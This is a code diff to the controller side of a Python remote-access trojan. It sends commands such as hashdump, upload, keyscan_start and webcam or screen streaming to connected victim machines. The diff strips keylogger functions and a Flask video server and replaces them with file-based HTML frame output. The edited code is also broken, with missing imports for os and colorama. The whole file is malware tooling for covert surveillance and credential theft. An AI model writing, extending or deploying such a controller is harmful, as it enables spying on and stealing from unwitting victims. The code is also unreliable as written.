@@ -1,18 +1,12 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string, request
-from colorama import Fore, init
 import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
 from datetime import datetime
+from os import path
 
-init(autoreset=True)
-
-app = Flask(__name__)
-clients = {}
-server_thread = None
 streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
@@ -34,13 +28,11 @@ html_template = """
     
     <!-- Video Stream Section -->
     <div>
-      <img src="{{ url_for('video_feed') }}" width="640" height="480">
+      <img src="{{ stream_source }}" width="640" height="480">
     </div>
   </body>
 </html>
 """
-
-
 
 def start_streaming(client_socket, mode, client_id):
     global streaming
@@ -53,20 +45,28 @@ def start_streaming(client_socket, mode, client_id):
     print(Fore.BLUE + "[ * ] Preparing player...")
     time.sleep(1)
 
-    @app.route('/')
-    def index():
-        return render_template_string(html_template, target_ip=target_ip, start_time=start_time)
+    # Generate the HTML content dynamically
+    html_content = html_template.replace("{{ target_ip }}", target_ip).replace("{{ start_time }}", start_time)
 
-    @app.route(f'/video_feed_{client_id}')
-    def video_feed():
-        return Response(generate_frames(client_socket, client_id),
-                        mimetype='multipart/x-mixed-replace; boundary=frame')
-      
-    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
+    # Create a folder to store the generated HTML (if not already present)
+    output_folder = "web_interface"
+    if not path.exists(output_folder):
+        os.makedirs(output_folder)
+    
+    # Define the path for the HTML file
+    html_path = path.join(output_folder, f"stream_{client_id}.html")
+
+    # Save the HTML content to a file
+    with open(html_path, 'w') as f:
+        f.write(html_content)
+    
+    print(Fore.BLUE + f"[ * ] Player generated at: {html_path}")
+
+    # Start streaming video
     print(Fore.BLUE + "[ * ] Streaming...")
 
-    # Run the Flask app in a separate thread to handle the streaming
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+    # Generate video frames for streaming
+    threading.Thread(target=lambda: generate_frames(client_socket, client_id)).start()
 
 def generate_frames(client_socket, client_id):
     global streaming
@@ -77,58 +77,35 @@ def generate_frames(client_socket, client_id):
         frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
         ret, buffer = cv2.imencode('.jpg', frame)
         frame = buffer.tobytes()
-        yield (b'--frame\r\n'
-               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+        
+        # Write the frame to a file (this file will be used in the generated HTML)
+        frame_path = path.join("web_interface", f"frame_{client_id}.jpg")
+        with open(frame_path, 'wb') as f:
+            f.write(frame)
 
-def keylogger_callback(event):
-    global keylogger_data
-    keylogger_data.append(event.name)
+        # Update the video stream source in the HTML file
+        update_html_frame_source(client_id, frame_path)
+        time.sleep(0.05)  # Adjust frame rate if needed
 
-def start_keylogger():
-    global keylogger_running
-    if not keylogger_running:
-        keyboard.on_press(keylogger_callback)
-        keylogger_running = True
-        print(Fore.YELLOW + "[ * ] Keylogger started.")
+def update_html_frame_source(client_id, frame_path):
+    # Update the HTML file to point to the new frame (for continuous streaming)
+    html_path = path.join("web_interface", f"stream_{client_id}.html")
+    with open(html_path, 'r') as f:
+        html_content = f.read()
 
-    @app.route('/stop_streaming')
-    def stop_streaming():
-    global streaming
-    streaming = False  # Stop streaming
-    print(Fore.RED + "[ * ] Stopping streaming...")
-    return redirect(url_for('index'))
+    # Replace the image source with the new frame
+    new_html_content = html_content.replace("{{ stream_source }}", frame_path)
 
+    # Write the updated HTML back to the file
+    with open(html_path, 'w') as f:
+        f.write(new_html_content)
 
-def stop_keylogger():
-    global keylogger_running
-    if keylogger_running:
-        keyboard.unhook_all()
-        keylogger_running = False
-        print(Fore.YELLOW + "[ * ] Keylogger stopped.")
-
-def dump_keylogger_data():
-    global keylogger_data
-    filtered_data = []
-    skip_keys = {"left shift", "right shift", "shift"}
-    for key in keylogger_data:
-        if key in skip_keys:
-            continue
-        if key == "space":
-            filtered_data.append(" ")
-        elif key == "backspace":
-            filtered_data.append("[backspace]")
-        elif key == "enter":
-            filtered_data.append("[enter]")
-        else:
-            filtered_data.append(key)
-    return ''.join(filtered_data)
+# Keep your existing functions below, such as `keylogger_callback`, `start_keylogger`, etc.
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
     client_id = f"{target_ip}:{target_port}"
     print(Fore.GREEN + f"[ * ] Session started for {client_id}")
-
-    clients[client_id] = {'socket': client_socket, 'streaming': False, 'keylogger_data': []}
 
     while True:
         try:
@@ -139,7 +116,7 @@ def handle_client(client_socket, addr):
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
         client_socket.send(command.encode('utf-8'))
 
-        # Handle the response from the client for different commands
+        # Handle commands
         if command == "hashdump":
             print(Fore.YELLOW + "[ * ] Starting...")
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
@@ -156,26 +133,26 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + response)
 
         elif command.startswith("upload"):
-    # Parse the upload command to extract file path and destination
-    try:
-        parts = command.split(' ')
-        if len(parts) < 3:
-            print(Fore.RED + "[ * ] Usage: upload <file_to_upload> -d <destination_path>")
-            continue
-        
-        file_to_upload = parts[1]
-        destination_path = parts[3] if '-d' in parts else None
-        
-        if not destination_path:
-            print(Fore.RED + "[ * ] Destination path not provided.")
-            continue
+            # Parse the upload command to extract file path and destination
+            try:
+                parts = command.split(' ')
+                if len(parts) < 3:
+                    print(Fore.RED + "[ * ] Usage: upload <file_to_upload> -d <destination_path>")
+                    continue
 
-        client_socket.send(command.encode('utf-8'))  # Send upload command to client
-        response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-        print(Fore.WHITE + response)
+                file_to_upload = parts[1]
+                destination_path = parts[3] if '-d' in parts else None
 
-    except Exception as e:
-        print(Fore.RED + f"[ * ] Error: {e}")
+                if not destination_path:
+                    print(Fore.RED + "[ * ] Destination path not provided.")
+                    continue
+
+                client_socket.send(command.encode('utf-8'))  # Send upload command to client
+                response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+                print(Fore.WHITE + response)
+
+            except Exception as e:
+                print(Fore.RED + f"[ * ] Error: {e}")
 
 
         elif command == "keyscan_start":
@@ -194,12 +171,14 @@ def handle_client(client_socket, addr):
             mode = "webcam" if "webcam" in command else "screenshare"
             start_streaming(client_socket, mode, client_id)
             continue
-        
+
         elif command.startswith("webcam_list"):
             print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
             client_socket.send(command.encode('utf-8'))
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
+
+# Keep your existing `main` function and other logic below
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
